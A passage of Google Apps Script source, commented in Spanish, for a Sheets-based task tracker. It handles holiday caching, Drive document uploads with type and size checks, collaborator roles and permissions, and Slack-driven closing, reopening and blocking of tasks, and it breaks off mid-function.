// Lee la hoja 'Feriados' (cols: pais | fecha | nombre). Cacheado 1h en
// CacheService bajo 'feriados_v1'. Si la hoja no existe, retorna {}.
function _loadFeriados(ss) {
  try {
    var cache = CacheService.getScriptCache();
    var cached = cache.get('feriados_v1');
    if (cached) {
      var obj = JSON.parse(cached);
      // Rehidratar a Sets para mantener la API estable downstream.
      var out = {};
      Object.keys(obj).forEach(function(code){
        var s = new Set();
        (obj[code] || []).forEach(function(iso){ s.add(iso); });
        out[code] = s;
      });
      return out;
    }
  } catch(e) { /* cache falló — recomputamos */ }

  var result = {};
  try {
    var ws = ss.getSheetByName(SHEET_FERIADOS);
    if (!ws) return result;
    var lr = ws.getLastRow();
    if (lr < 2) return result;
    var data = ws.getRange(2, 1, lr - 1, 3).getValues();
    data.forEach(function(row){
      var pais = (row[0] || '').toString().trim().toUpperCase();
      if (!pais) return;
      var raw = row[1];
      var iso = '';
      if (raw instanceof Date) {
        iso = Utilities.formatDate(raw, 'America/Bogota', 'yyyy-MM-dd');
      } else {
        var m = (raw || '').toString().trim().match(/^(\d{4})-(\d{2})-(\d{2})/);
        if (m) iso = m[1] + '-' + m[2] + '-' + m[3];
      }
      if (!iso) return;
      if (!result[pais]) result[pais] = new Set();
      result[pais].add(iso);
    });
  } catch(e) {
    Logger.log('[feriados] read failed: ' + e.message);
    return {};
  }

  // Cachear: serializamos Sets a arrays de strings para JSON.
  try {
    var serial = {};
    Object.keys(result).forEach(function(code){
      serial[code] = [];
      result[code].forEach(function(iso){ serial[code].push(iso); });
    });
    CacheService.getScriptCache().put('feriados_v1', JSON.stringify(serial), 3600);
  } catch(e) { /* cache write falló — no es crítico */ }

  return result;
}
// Mueve una tarea al Historial preservando su ID original.
// Ya NO renumera las tareas restantes: los IDs son persistentes (pueden quedar huecos 1,3,7,...).
// Lock para que read+append+delete sean atómicos: sin lock, dos cierres concurrentes pueden
// borrar filas incorrectas (el deleteRow corre contra el sheet ya mutado por otro usuario).
function moveToHistorial(ss, wsA, row) {
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  try {
    var wsH = ss.getSheetByName(SHEET_HISTORIAL);
    var lc = Math.min(wsA.getLastColumn(), TASK_COLS);
    var rd = wsA.getRange(row, 1, 1, lc).getValues()[0];
    while (rd.length < TASK_COLS) rd.push('');
    // Preserva el ID original — NO reasignar. Así las referencias (notas, Slack, humanas) siguen válidas.
    wsH.appendRow(rd);
    wsA.deleteRow(row);
  } finally {
    lock.releaseLock();
  }
}

// Calcula el próximo ID único entre activos + historial (evita colisiones tras mover tareas).
function nextTaskId(ss) {
  var maxId = 0;
  ['Tracking Activo','Historial'].forEach(function(name){
    var ws = ss.getSheetByName(name); if (!ws) return;
    var lr = ws.getLastRow(); if (lr < 4) return;
    var ids = ws.getRange(4, 1, lr - 3, 1).getValues();
    ids.forEach(function(r){ var v = parseInt(r[0], 10); if (!isNaN(v) && v > maxId) maxId = v; });
  });
  return maxId + 1;
}
function getCurrentWeekLabel(){var now=new Date(),mon=new Date(now);mon.setDate(now.getDate()-(now.getDay()===0?6:now.getDay()-1));var fri=new Date(mon);fri.setDate(mon.getDate()+4);var m=['ene','feb','mar','abr','may','jun','jul','ago','sep','oct','nov','dic'];return mon.getDate()+'-'+fri.getDate()+' '+m[fri.getMonth()]+' '+fri.getFullYear()}

// ════════════════════════════════════════════════════════════════
// DOCUMENTS (Drive integration)
// ════════════════════════════════════════════════════════════════
// Cada task/project tiene columna "Documentos" con JSON [{name, url, id}].
// Subidas nuevas se clasifican en subcarpetas automáticas bajo la raíz
// configurada en Config!DriveFolder.

function _parseDocs(cellValue) {
  if (!cellValue) return [];
  var s = cellValue.toString().trim();
  if (!s) return [];
  try {
    var arr = JSON.parse(s);
    return Array.isArray(arr) ? arr : [];
  } catch (e) { return []; }
}

function _serializeDocs(docs) {
  if (!docs || !docs.length) return '';
  return JSON.stringify(docs);
}

// ── COLABORADORES (col 21, JSON-en-celda, mismo patrón que Documentos) ──
// Cada colaborador = {name, role} con role ∈ {'ver','editar'}.
//   ver    → visibilidad + comentar.
//   editar → además edita/avanza/cierra; la tarea le suma a su carga.
// El responsable principal (col 3 'resp') sigue siendo uno solo; esto es aditivo.
var _COLAB_ROLES = { 'ver': 1, 'editar': 1 };

// Parseo defensivo (igual que _parseDocs): JSON.parse en try/catch, valida role,
// descarta entradas sin name. Devuelve [] ante celda vacía/JSON inválido/no-array.
function _parseColaboradores(cell) {
  if (!cell) return [];
  var s = cell.toString().trim();
  if (!s) return [];
  var arr;
  try { arr = JSON.parse(s); } catch (e) { return []; }
  if (!Array.isArray(arr)) return [];
  var out = [];
  for (var i = 0; i < arr.length; i++) {
    var c = arr[i];
    if (!c || typeof c !== 'object') continue;
    var name = (c.name == null ? '' : c.name.toString().trim());
    if (!name) continue; // ignora entradas sin name
    var role = (c.role == null ? '' : c.role.toString().trim().toLowerCase());
    if (!_COLAB_ROLES[role]) role = 'ver'; // default seguro
    out.push({ name: name, role: role });
  }
  return out;
}

// Serializa a JSON string ('' si vacío → celda limpia, igual que _serializeDocs).
function _stringifyColaboradores(arr) {
  if (!arr || !arr.length) return '';
  var clean = [];
  for (var i = 0; i < arr.length; i++) {
    var c = arr[i];
    if (!c) continue;
    var name = (c.name == null ? '' : c.name.toString().trim());
    if (!name) continue;
    var role = (c.role == null ? '' : c.role.toString().trim().toLowerCase());
    if (!_COLAB_ROLES[role]) role = 'ver';
    clean.push({ name: name, role: role });
  }
  return clean.length ? JSON.stringify(clean) : '';
}

// ¿`name` es colaborador de `task`? Compara con _normalizeName (como el resto del
// código). roleMin === 'editar' exige role 'editar'; cualquier otro valor acepta
// cualquier rol (ver o editar). task.colaboradores se asume [{name,role}] o ausente.
function _isColaborador(task, name, roleMin) {
  if (!task || !name) return false;
  var list = task.colaboradores;
  if (!list || !list.length) return false;
  var target = _normalizeName(name);
  if (!target) return false;
  for (var i = 0; i < list.length; i++) {
    var c = list[i];
    if (!c || _normalizeName(c.name) !== target) continue;
    if (roleMin === 'editar') { if (c.role === 'editar') return true; }
    else { return true; }
  }
  return false;
}

// Extrae el ID de Drive de una URL o retorna el valor tal cual si ya parece ID.
function _extractDriveId(urlOrId) {
  if (!urlOrId) return '';
  var s = urlOrId.toString().trim();
  // URL típica: /folders/XXX  o  /d/XXX  o  ?id=XXX
  var m = s.match(/\/folders\/([a-zA-Z0-9_-]+)/) ||
          s.match(/\/d\/([a-zA-Z0-9_-]+)/) ||
          s.match(/[?&]id=([a-zA-Z0-9_-]+)/);
  if (m) return m[1];
  // Si ya parece un ID crudo (solo chars válidos)
  if (/^[a-zA-Z0-9_-]{20,}$/.test(s)) return s;
  return '';
}

// Resuelve la carpeta raíz configurada en Config!DriveFolder. Lanza si no
// está configurada o no es accesible. Los mensajes de error apuntan al admin
// (primer email en Config!Heads) cuando es posible — así el usuario sabe
// a quién pedirle que arregle la config en lugar de quedar trabado.
function _getRootFolder() {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var config = readConfig(ss);
  var cfgValue = config['DriveFolder'] || config['driveFolder'] || '';
  if (!cfgValue) {
    // Tomamos el primer email de Heads como contacto para el usuario.
    // Si no hay Heads configurados, mensaje genérico (sigue siendo accionable).
    var headsRaw = (config['Heads'] || '').toString();
    var firstHead = headsRaw.split(',').map(function(s){ return s.trim(); }).filter(Boolean)[0] || '';
    if (firstHead) {
      throw new Error('Pedile a ' + firstHead + ' que configure Config!DriveFolder con la URL de la carpeta de Drive raíz.');
    }
    throw new Error('Falta configurar Config!DriveFolder: pega la URL o el ID de la carpeta de Drive raíz en la hoja Config.');
  }
  var folderId = _extractDriveId(cfgValue);
  if (!folderId) {
    // Truncamos el valor recibido para no inflar el error con strings largos
    // (la URL o el ID típicos no superan 80 chars; valores raros se ven igual).
    var preview = cfgValue.toString();
    if (preview.length > 80) preview = preview.substring(0, 80) + '...';
    throw new Error("El valor de Config!DriveFolder no parece una URL de Drive ni un ID. Recibido: '" + preview + "'.");
  }
  try {
    return DriveApp.getFolderById(folderId);
  } catch (e) {
    // Caso típico: el usuario perdió el scope de Drive (reautorización pendiente)
    // o el dueño del webapp no aprobó el scope. Mensaje accionable en lugar de raw.
    throw new Error('No tengo permiso para acceder a la carpeta de Drive. Pedile al dueño del script que apruebe los permisos.');
  }
}

// Retorna (o crea) una subcarpeta por nombre dentro de parent.
function _ensureSubfolder(parent, name) {
  var clean = (name || '').toString().trim() || 'Sin clasificar';
  // Drive no permite '/' en nombres de carpeta; lo reemplazamos para no romper.
  clean = clean.replace(/\//g, '-').slice(0, 120);
  var it = parent.getFoldersByName(clean);
  if (it.hasNext()) return it.next();
  return parent.createFolder(clean);
}

// Extrae el año (yyyy) de una celda de fecha (Date o string dd/MM/yyyy ...).
// Fallback al año actual si no parsea — así nunca quedan archivos sin año.
function _folderYearFromCell(cell) {
  try {
    if (cell instanceof Date) return cell.getFullYear().toString();
    var s = (cell || '').toString().trim();
    var m = s.match(/(\d{1,2})\/(\d{1,2})\/(\d{4})/); // dd/MM/yyyy
    if (m) return m[3];
    var d = new Date(s);
    if (!isNaN(d.getTime())) return d.getFullYear().toString();
  } catch (e) {}
  return new Date().getFullYear().toString();
}

// Resuelve la carpeta final donde debe ir un archivo según la taxonomía:
//   Tareas:    Año / País / Cliente / Tipo / (NombreProyecto | "Tareas sueltas")
//   Proyectos: Año / País / "Proyectos" / NombreProyecto / Tipo
// Get-or-create en cada nivel (idempotente). Valores faltantes caen a labels
// "Sin …" para que nada termine suelto en la raíz.
function _resolveTargetFolder(kind, itemId) {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var root = _getRootFolder();
  var tipo = '', pais = '', projName = '', cliente = '', year = '';

  if (kind === 'task') {
    var ws = ss.getSheetByName(SHEET_ACTIVO);
    var lr = ws.getLastRow();
    var lc = Math.min(ws.getLastColumn(), TASK_COLS);
    var data = ws.getRange(4, 1, Math.max(0, lr - 3), lc).getValues();
    for (var i = 0; i < data.length; i++) {
      if (data[i][0] == itemId) {
        year = _folderYearFromCell(data[i][8]);             // col 9  = Fecha Creación
        pais = (data[i][12] || '').toString().trim();       // col 13 = País
        tipo = (data[i][14] || '').toString().trim();       // col 15 = Tipo Trabajo
        cliente = (data[i][19] || '').toString().trim();    // col 20 = AreaSolicitante
        var pid = parseInt((data[i][11] || '').toString().trim(), 10);
        if (!isNaN(pid)) {
          var projRow = _readProjectById(ss, pid);
          if (projRow) {
            var pws = ss.getSheetByName(SHEET_PROYECTOS);
            projName = (pws.getRange(projRow.row, 2).getValue() || '').toString().trim();
          }
        }
        break;
      }
    }
    var tYear = _ensureSubfolder(root, year);
    var tPais = _ensureSubfolder(tYear, pais || 'Sin país');
    var tCli  = _ensureSubfolder(tPais, cliente || 'Sin cliente');
    var tTipo = _ensureSubfolder(tCli, tipo || 'Sin clasificar');
    return _ensureSubfolder(tTipo, projName || 'Tareas sueltas');
  }

  // kind === 'project'
  var pws2 = ss.getSheetByName(SHEET_PROYECTOS);
  var plr = pws2.getLastRow();
  var pdata = pws2.getRange(2, 1, Math.max(0, plr - 1), PROJ_COLS).getValues();
  for (var j = 0; j < pdata.length; j++) {
    if (pdata[j][0] == itemId) {
      pais = (pdata[j][2] || '').toString().trim();
      tipo = (pdata[j][13] || '').toString().trim();
      projName = (pdata[j][1] || '').toString().trim();
      break;
    }
  }
  var pYear = _ensureSubfolder(root, new Date().getFullYear().toString());
  var pPais = _ensureSubfolder(pYear, pais || 'Sin país');
  var pProy = _ensureSubfolder(pPais, 'Proyectos');
  var pName = _ensureSubfolder(pProy, projName || 'Sin nombre');
  return _ensureSubfolder(pName, tipo || 'Sin clasificar');
}

// Lee los docs actuales del item + la posición en el sheet + la columna.
function _readDocsFor(kind, itemId) {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  if (kind === 'task') {
    var ws = ss.getSheetByName(SHEET_ACTIVO);
    var lr = ws.getLastRow();
    if (lr < 4) return null;
    var lc = Math.min(ws.getLastColumn(), TASK_COLS);
    var data = ws.getRange(4, 1, lr - 3, lc).getValues();
    for (var i = 0; i < data.length; i++) {
      if (data[i][0] == itemId) {
        return { ss: ss, ws: ws, row: i + 4, col: TASK_DOCS_COL, docs: _parseDocs(data[i][TASK_DOCS_COL - 1]),
                 target: { resp: data[i][2], pais: (data[i][12] || '').toString().trim() } };
      }
    }
  } else if (kind === 'project') {
    var pws = ss.getSheetByName(SHEET_PROYECTOS);
    var plr = pws.getLastRow();
    if (plr < 2) return null;
    var pdata = pws.getRange(2, 1, plr - 1, PROJ_COLS).getValues();
    for (var j = 0; j < pdata.length; j++) {
      if (pdata[j][0] == itemId) {
        var parts = (pdata[j][12] || '').toString().split(',').map(function(s){ return s.trim(); }).filter(Boolean);
        return { ss: ss, ws: pws, row: j + 2, col: PROJ_DOCS_COL, docs: _parseDocs(pdata[j][PROJ_DOCS_COL - 1]),
                 target: { responsable: (pdata[j][4] || '').toString().trim(),
                           pais: (pdata[j][2] || '').toString().trim(),
                           participantes: parts } };
      }
    }
  }
  return null;
}

// Sube un archivo (base64) a Drive y lo vincula al item. Retorna el doc descriptor.
// SECURITY: aplica cap de tamaño y allowlist de MIME types para evitar abuso.
var _UPLOAD_MAX_BYTES = 45 * 1024 * 1024; // 45 MB
var _UPLOAD_ALLOWED_MIME = {
  'application/pdf': 1,
  'application/msword': 1,
  'application/vnd.openxmlformats-officedocument.wordprocessingml.document': 1,
  'application/vnd.ms-excel': 1,
  'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet': 1,
  'image/png': 1,
  'image/jpeg': 1,
  'image/jpg': 1,
  'text/plain': 1
};
// Wrapper público: garantiza que cualquier excepción (Drive cuota, permisos,
// scope no autorizado) llegue al cliente como {success:false, error} y NO
// rompa el failureHandler del frontend.
function uploadDocument(kind, itemId, fileData) {
  return _safeMutation(function() { return _uploadDocumentImpl(kind, itemId, fileData); });
}
function _uploadDocumentImpl(kind, itemId, fileData) {
  if (!fileData || !fileData.data || !fileData.name) {
    return { success: false, error: 'Datos de archivo inválidos' };
  }
  var ctx = _getAuthContext();
  var info = _readDocsFor(kind, itemId);
  if (!info) return { success: false, error: (kind === 'project' ? 'Proyecto' : 'Tarea') + ' #' + itemId + ' no encontrado' };
  if (kind === 'task') _authorizeTaskWrite(ctx, info.target);
  else _authorizeProjectWrite(ctx, info.target);

  // Validar MIME en allowlist (rechaza tipos peligrosos: html, exe, scripts, etc.)
  var mime = (fileData.mimeType || '').toString().trim().toLowerCase();
  if (!_UPLOAD_ALLOWED_MIME[mime]) {
    return { success: false, error: 'Tipo de archivo no permitido' };
  }

  var folder;
  try {
    folder = _resolveTargetFolder(kind, itemId);
  } catch (e) {
    return { success: false, error: e.message };
  }

  // Cap ANTES de decodificar: base64 infla ~33% y materializar un archivo
  // enorme en memoria puede agotar el límite de ejecución antes del guard.
  // data.length * 0.75 ≈ bytes reales.
  if (fileData.data.length * 0.75 > _UPLOAD_MAX_BYTES) {
    return { success: false, error: 'Archivo demasiado grande (máx. 45 MB)' };
  }
  var bytes = Utilities.base64Decode(fileData.data);
  // Cap de tamaño para evitar agotar cuota de Drive del owner del webapp.
  if (bytes.length > _UPLOAD_MAX_BYTES) {
    return { success: false, error: 'Archivo demasiado grande (máx. 45 MB)' };
  }
  var blob = Utilities.newBlob(bytes, mime, fileData.name);
  var file = folder.createFile(blob);

  var doc = { name: file.getName(), url: file.getUrl(), id: file.getId(),
              uploadedBy: ctx.user.name, uploadedAt: new Date().toISOString() };
  var docs = info.docs.concat([doc]);
  info.ws.getRange(info.row, info.col).setValue(_serializeDocs(docs));
  // invalidateCache() lo dispara _safeMutation; no llamar acá (doble call).
  return { success: true, doc: doc };
}

// Vincula un link existente de Drive (no mueve el archivo).
function attachDocumentLink(kind, itemId, link) {
  return _safeMutation(function() { return _attachDocumentLinkImpl(kind, itemId, link); });
}
function _attachDocumentLinkImpl(kind, itemId, link) {
  if (!link || !link.url) return { success: false, error: 'URL requerida' };
  var url = link.url.toString().trim();
  // Validar esquema: solo http(s). Esto bloquea javascript:, data:, file:, etc.
  // que podrían ser usados como vector XSS persistente al renderear el link.
  if (!/^https?:\/\//i.test(url)) {
    return { success: false, error: 'URL inválida: solo se aceptan https:// o http://' };
  }
  // Validar largo razonable (evita DoS por strings gigantes en la celda)
  if (url.length > 2048) {
    return { success: false, error: 'URL demasiado larga (máx. 2048 caracteres)' };
  }
  // Bloquear caracteres de control que podrían romper el render del atributo HTML
  if (/[ -]/.test(url)) {
    return { success: false, error: 'URL contiene caracteres inválidos' };
  }
  var ctx = _getAuthContext();
  var info = _readDocsFor(kind, itemId);
  if (!info) return { success: false, error: (kind === 'project' ? 'Proyecto' : 'Tarea') + ' #' + itemId + ' no encontrado' };
  if (kind === 'task') _authorizeTaskWrite(ctx, info.target);
  else _authorizeProjectWrite(ctx, info.target);

  var doc = {
    name: (link.name || '').toString().trim() || url,
    url: url,
    id: _extractDriveId(url) || '',
    external: true,
    uploadedBy: ctx.user.name,
    uploadedAt: new Date().toISOString()
  };
  var docs = info.docs.concat([doc]);
  info.ws.getRange(info.row, info.col).setValue(_serializeDocs(docs));
  // invalidateCache() lo dispara _safeMutation; no llamar acá (doble call).
  return { success: true, doc: doc };
}

// Quita la referencia del tracker (NO borra el archivo en Drive).
function removeDocument(kind, itemId, docIndex) {
  return _safeMutation(function() { return _removeDocumentImpl(kind, itemId, docIndex); });
}
function _removeDocumentImpl(kind, itemId, docIndex) {
  var ctx = _getAuthContext();
  var info = _readDocsFor(kind, itemId);
  if (!info) return { success: false, error: 'No encontrado' };
  if (kind === 'task') _authorizeTaskWrite(ctx, info.target);
  else _authorizeProjectWrite(ctx, info.target);

  var idx = parseInt(docIndex, 10);
  if (isNaN(idx) || idx < 0 || idx >= info.docs.length) return { success: false, error: 'Índice inválido' };
  info.docs.splice(idx, 1);
  info.ws.getRange(info.row, info.col).setValue(_serializeDocs(info.docs));
  // invalidateCache() lo dispara _safeMutation; no llamar acá (doble call).
  return { success: true };
}

// ════════════════════════════════════════════════════════════════
// COLABORADORES EN TAREAS · CRUD (col 21, JSON-en-celda)
// ════════════════════════════════════════════════════════════════
// A una tarea se le pueden agregar personas con rol 'ver' (visibilidad +
// comentar) o 'editar' (además edita/avanza/cierra; suma a su carga). El
// responsable principal (col 3 'resp') sigue siendo uno solo. Mismo patrón
// JSON-en-celda que Documentos (col 17).

// Permiso para GESTIONAR la lista de colaboradores de una tarea: el resp de la
// tarea, o manager de su país, o head. NO un colaborador-editar (un colaborador
// puede trabajar la tarea pero no administrar a quién más se le comparte).
// `target` = {resp, pais}. Lanza si no puede.
function _authorizeColaboradoresWrite(ctx, target) {
  if (ctx.role === 'head') return;
  if (ctx.role === 'manager') {
    var cc = (target && target.pais) || (target ? getCountryForMember(target.resp, ctx.equipos) : '');
    if (cc && cc !== ctx.user.code) {
      throw new Error('Sin permiso: tarea de otro país (' + cc + ')');
    }
    return;
  }
  // specialist: solo el responsable de la tarea puede gestionar colaboradores.
  if (!target || _normalizeName(target.resp) !== _normalizeName(ctx.user.name)) {
    throw new Error('Sin permiso: solo el responsable, manager o head pueden gestionar colaboradores');
  }
}

// Reemplaza la lista completa de colaboradores de una tarea.
//   lista = [{name, role}] con role ∈ {'ver','editar'}.
// Permiso: resp / manager(de su país) / head. Valida cada role; NO permite
// agregar al propio resp como colaborador (redundante). Persiste JSON en col 21.
function setTaskColaboradores(taskId, lista) {
  return _telemetry('setTaskColaboradores', function() {
    return _safeMutation(function() { return _setTaskColaboradoresImpl(taskId, lista); });
  }, { taskId: taskId, count: (lista && lista.length) || 0 });
}
function _setTaskColaboradoresImpl(taskId, lista) {
  var ctx = _getAuthContext();
  var current = _readTaskById(ctx.ss, taskId);
  if (!current) return _err('NOT_FOUND', 'Tarea #' + taskId + ' no encontrada');
  _authorizeColaboradoresWrite(ctx, current);

  var ws = ctx.ss.getSheetByName(SHEET_ACTIVO);
  // Guard anti-drift: si la hoja todavía no tiene la col 21, NO escribir (Sheets
  // auto-expandiría y desplazaría las lecturas). Avisar que falta migrar.
  if (TASK_COLAB_COL > ws.getLastColumn()) {
    return _err('SHEET_NOT_MIGRATED', 'La hoja no tiene la columna Colaboradores. Pedile al admin que corra migrarColaboradores().');
  }

  // Normalizar + validar la lista entrante.
  var arr = Array.isArray(lista) ? lista : [];
  var respNorm = _normalizeName(current.resp);
  var out = [];
  var seen = {};
  for (var i = 0; i < arr.length; i++) {
    var c = arr[i];
    if (!c || typeof c !== 'object') continue;
    var name = (c.name == null ? '' : c.name.toString().trim());
    if (!name) continue; // ignora entradas sin name
    var role = (c.role == null ? '' : c.role.toString().trim().toLowerCase());
    if (!_COLAB_ROLES[role]) {
      return _err('VALIDATION', 'Rol inválido para "' + name + '": debe ser "ver" o "editar".');
    }
    var nn = _normalizeName(name);
    // No permitir al propio resp como colaborador (redundante).
    if (nn === respNorm) {
      return _err('VALIDATION', 'El responsable de la tarea no puede agregarse como colaborador.');
    }
    if (seen[nn]) continue; // dedup por nombre normalizado (último gana el rol del primero visto)
    seen[nn] = 1;
    out.push({ name: name, role: role });
  }

  var json = _stringifyColaboradores(out);
  var oldJson = _stringifyColaboradores(current.colaboradores || []);
  ws.getRange(current.row, TASK_COLAB_COL).setValue(_sanitizeCell(json));
  // Activity log best-effort (no aborta la mutation si falla).
  _logActivity(ctx, taskId, 'colaboradores', 'colaboradores', oldJson, json);
  // Aviso a los colaboradores NUEVOS (diff contra la lista previa) — no a los
  // que ya estaban. canSeeName: como colaborador ya ve la tarea.
  var prevNorm = {};
  (current.colaboradores || []).forEach(function(c){ prevNorm[_normalizeName(c.name)] = 1; });
  out.forEach(function(c){
    if (!prevNorm[_normalizeName(c.name)]) {
      _notify(ctx, c.name, { kind: 'colaborador', role: c.role, taskId: taskId,
                             taskName: current.nombre, conf: current.confidencialidad, canSeeName: true });
    }
  });
  // invalidateCache() lo dispara _safeMutation; no llamar acá (doble call).
  return { success: true, colaboradores: out };
}

// Azúcar: agrega/actualiza UN colaborador (set role) sobre la lista actual.
// Reutiliza setTaskColaboradores para una sola fuente de validación/persistencia.
function addTaskColaborador(taskId, name, role) {
  return _safeMutation(function() {
    var ctx = _getAuthContext();
    var current = _readTaskById(ctx.ss, taskId);
    if (!current) return _err('NOT_FOUND', 'Tarea #' + taskId + ' no encontrada');
    var list = (current.colaboradores || []).slice();
    var nn = _normalizeName(name);
    var found = false;
    for (var i = 0; i < list.length; i++) {
      if (_normalizeName(list[i].name) === nn) { list[i] = { name: list[i].name, role: role }; found = true; break; }
    }
    if (!found) list.push({ name: (name == null ? '' : name.toString().trim()), role: role });
    return _setTaskColaboradoresImpl(taskId, list);
  });
}

// Azúcar: quita UN colaborador (por nombre) de la lista actual.
function removeTaskColaborador(taskId, name) {
  return _safeMutation(function() {
    var ctx = _getAuthContext();
    var current = _readTaskById(ctx.ss, taskId);
    if (!current) return _err('NOT_FOUND', 'Tarea #' + taskId + ' no encontrada');
    var nn = _normalizeName(name);
    var list = (current.colaboradores || []).filter(function(c){ return _normalizeName(c.name) !== nn; });
    return _setTaskColaboradoresImpl(taskId, list);
  });
}

// ════════════════════════════════════════════════════════════════
// SLACK HELPERS
// ════════════════════════════════════════════════════════════════
// ── Busca candidatos por fuzzy match. Retorna top 3 ordenados por score.
// Cada candidato: {id, nombre, row, score, ratio, confidence: 'high'|'low'|'none'}
// high: ≥3 matches y ratio ≥0.5   low: ≥1 match   none: sin coincidencia útil
// Aunque es un read-only, lo envolvemos en _safeMutation para que un sheet
// lockup u otro error transitorio se propague al frontend como
// {success:false, error} y caiga en los failureHandlers existentes.
function findTaskCandidates(text) {
  return _safeMutation(function() { return _findTaskCandidatesImpl(text); });
}
function _findTaskCandidatesImpl(text) {
  var ss = SpreadsheetApp.openById(SHEET_ID), ws = ss.getSheetByName(SHEET_ACTIVO);
  var lr = ws.getLastRow();
  if (lr < 4) return {candidates: [], confidence: 'none'};
  var lc = Math.min(ws.getLastColumn(), TASK_COLS);
  var data = ws.getRange(4, 1, lr - 3, lc).getValues();
  var st = (text || '').toLowerCase();
  var words = st.split(/\s+/).filter(function(w){return w.length > 2});
  if (words.length === 0) return {candidates: [], confidence: 'none'};

  var scored = [];
  for (var i = 0; i < data.length; i++) {
    var n = (data[i][1] || '').toLowerCase(); if (!n) continue;
    var nameWords = n.split(/\s+/).filter(function(w){return w.length > 2});
    if (nameWords.length === 0) continue;
    var sc = 0;
    words.forEach(function(x){ if (n.indexOf(x) >= 0) sc++; });
    if (sc === 0) continue;
    // ratio: matches / (palabras relevantes del nombre) — penaliza matches triviales en nombres largos
    var ratio = sc / Math.max(nameWords.length, 1);
    scored.push({id: data[i][0], nombre: data[i][1], row: i + 4, score: sc, ratio: ratio});
  }
  scored.sort(function(a, b){ return (b.score - a.score) || (b.ratio - a.ratio); });
  var top = scored.slice(0, 3);
  var confidence = 'none';
  if (top.length > 0) {
    var best = top[0];
    if (best.score >= 3 && best.ratio >= 0.5) confidence = 'high';
    else if (best.score >= 1) confidence = 'low';
  }
  return {candidates: top, confidence: confidence};
}

// Cierra una tarea por ID (desde Slack o tras confirmación). Valida permiso:
// desde Slack, Session=owner (head) así que pasa; desde el webapp, el usuario
// debe tener permiso sobre la tarea según su rol.
function closeTaskById(taskId, slackUser) {
  return _telemetry('closeTaskById', function() {
    return _safeMutation(function() { return _closeTaskByIdImpl(taskId, slackUser); });
  }, { taskId: taskId, viaSlack: !!slackUser });
}
function _closeTaskByIdImpl(taskId, slackUser) {
  var ctx = _getAuthContext();
  var current = _readTaskById(ctx.ss, taskId);
  if (!current) return { success: false, message: 'Tarea #' + taskId + ' no encontrada' };
  _authorizeTaskWrite(ctx, current);

  var ws = ctx.ss.getSheetByName(SHEET_ACTIVO);
  // Lock para serializar la mutación. moveToHistorial se llama fuera (tiene su
  // propio lock interno; no asumimos reentrancia del lock de Apps Script).
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  var tn;
  try {
    tn = ws.getRange(current.row, 2).getValue();
    ws.getRange(current.row, 7).setValue('Listo');
    ws.getRange(current.row, 10).setValue(new Date());
  } finally {
    lock.releaseLock();
  }
  moveToHistorial(ctx.ss, ws, current.row);
  invalidateCache();
  _logActivity(ctx, taskId, 'close', 'status', current.status || '', 'Listo');
  return { success: true, id: taskId, nombre: tn, message: 'Tarea #' + taskId + ' "' + tn + '" cerrada y movida a Historial' };
}

// Busca una tarea por ID en el Historial. Devuelve {row, resp, pais, rowData}
// con la fila completa (padded a TASK_COLS) o null si no está.
function _readHistorialTaskById(ss, taskId) {
  var ws = ss.getSheetByName(SHEET_HISTORIAL);
  if (!ws) return null;
  var lr = ws.getLastRow();
  if (lr < 4) return null;
  var lc = Math.min(ws.getLastColumn(), TASK_COLS);
  var data = ws.getRange(4, 1, lr - 3, lc).getValues();
  for (var i = 0; i < data.length; i++) {
    if (data[i][0] == taskId) {
      var rowData = data[i].slice();
      while (rowData.length < TASK_COLS) rowData.push('');
      return { row: i + 4, resp: data[i][2], pais: (data[i][12] || '').toString().trim(), rowData: rowData };
    }
  }
  return null;
}

// Reabre una tarea cerrada: la mueve del Historial de vuelta a Tracking Activo,
// la pone "En curso" y limpia la fecha de cierre. Mismas reglas de permiso que
// el cierre (_authorizeTaskWrite). Preserva el ID original.
function reopenTaskById(taskId) {
  return _telemetry('reopenTaskById', function() {
    return _safeMutation(function() { return _reopenTaskByIdImpl(taskId); });
  }, { taskId: taskId });
}
function _reopenTaskByIdImpl(taskId) {
  var ctx = _getAuthContext();
  var found = _readHistorialTaskById(ctx.ss, taskId);
  if (!found) return { success: false, message: 'Tarea #' + taskId + ' no encontrada en el historial' };
  _authorizeTaskWrite(ctx, { resp: found.resp, pais: found.pais });

  var wsH = ctx.ss.getSheetByName(SHEET_HISTORIAL);
  var wsA = ctx.ss.getSheetByName(SHEET_ACTIVO);
  var tn = found.rowData[1];
  found.rowData[6] = 'En curso'; // col 7 = estado
  found.rowData[9] = '';         // col 10 = fecha de cierre

  // Lock para que append+delete sean atómicos (igual que moveToHistorial):
  // sin él, un reopen concurrente podría borrar la fila equivocada del Historial.
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  try {
    wsA.appendRow(found.rowData);
    wsH.deleteRow(found.row);
  } finally {
    lock.releaseLock();
  }
  invalidateCache();
  _logActivity(ctx, taskId, 'reopen', 'status', 'Listo', 'En curso');
  return { success: true, id: taskId, nombre: tn, message: 'Tarea #' + taskId + ' "' + tn + '" reabierta y movida a Tracking Activo' };
}

// Bloquea una tarea por ID. Mismas validaciones que closeTaskById.
function blockTaskById(taskId, reason, slackUser) {
  return _telemetry('blockTaskById', function() {
    return _safeMutation(function() { return _blockTaskByIdImpl(taskId, reason, slackUser); });
  }, { taskId: taskId, viaSlack: !!slackUser, hasReason: !!reason });
}
function _blockTaskByIdImpl(taskId, reason, slackUser) {
  var ctx = _getAuthContext();
  var current = _readTaskById(ctx.ss, taskId);
  if (!current) return { success: false, message: 'Tarea #' + taskId + ' no encontrada' };
  _authorizeTaskWrite(ctx, current);

  var ws = ctx.ss.getSheetByName(SHEET_ACTIVO);
  // Lock para serializar el read-modify-write de notas (evita perder concurrencia).
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  try {
    var tn = ws.getRange(current.row, 2).getValue();
    ws.getRange(current.row, 7).setValue('Bloqueado');
    var prevNotes = ws.getRange(current.row, 11).getValue() || '';
